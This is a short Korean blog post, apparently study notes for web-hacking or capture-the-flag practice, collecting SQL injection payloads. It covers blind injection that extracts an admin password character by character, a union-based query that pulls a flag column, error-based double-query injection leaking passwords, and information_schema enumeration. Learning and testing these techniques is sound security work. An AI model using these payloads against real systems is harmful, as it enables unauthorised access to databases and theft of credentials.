---
layout: post
title:  Sql Injection
date: 2023-12-10 20:00:01 +0900
categories: Web
---
## 시스템 테이블
> `information_schema` <br>
> `mysql` <br>
> `performance_schema` <br>
> `sys` <br>


## blind
```sql
1' or (1=1) and '1'='1 -> 참일때
1' or (1=2) and '1'='1 -> 거짓일 때
```
```sql
1' or ((SELECT substr(user_pw,1,1) FROM blind WHERE user_id='admin')='i') and '1'='1
1' or ((SELECT ASCII(substr(user_pw,1,1)) FROM blind WHERE user_id='admin')=105) and '1'='1
```
## Union
```sql
' union select 1,flag,3,4,5 from (select 1,2,3 as flag,4,5 union select * from findflag_2 limit 1)x
-> 컬럼을 몰라도 위 코드를 이용하면 컬럼위치로 select 할 수 있다.
```
## 필터링 우회
- <https://g-idler.tistory.com/61>


## error base 
- <https://4rgos.tistory.com/12>
- <https://www.bugbountyclub.com/pentestgym/view/53>
- <https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c>


```sql
' or row(1,1)>(select count(*),concat((select pw from users),0x3a,floor(rand(0)*2)) x from (select 1 union select 2 union select 3)a group by x limit 1)
' or row(1,1)>(select count(*),concat((pw),0x3a,floor(rand(0)*2)) x from (select 1 union select 2 union select 3)a group by x limit 1)
-> 모든 구문 되는 error based, 앞에서 조회하는 * 중 하나도 가져올 수 있다.
```

## information schema
- <https://poqw.tistory.com/24>
- <https://aceatom.tistory.com/271>

```sql
select schema_name from information_schema.schemata
select table_schema,table_name from information_schema.tables where table_schema='데이터베이스 명'
select table_name,column_name from information_schema.columns where table_schema='데이터베이스 명'
```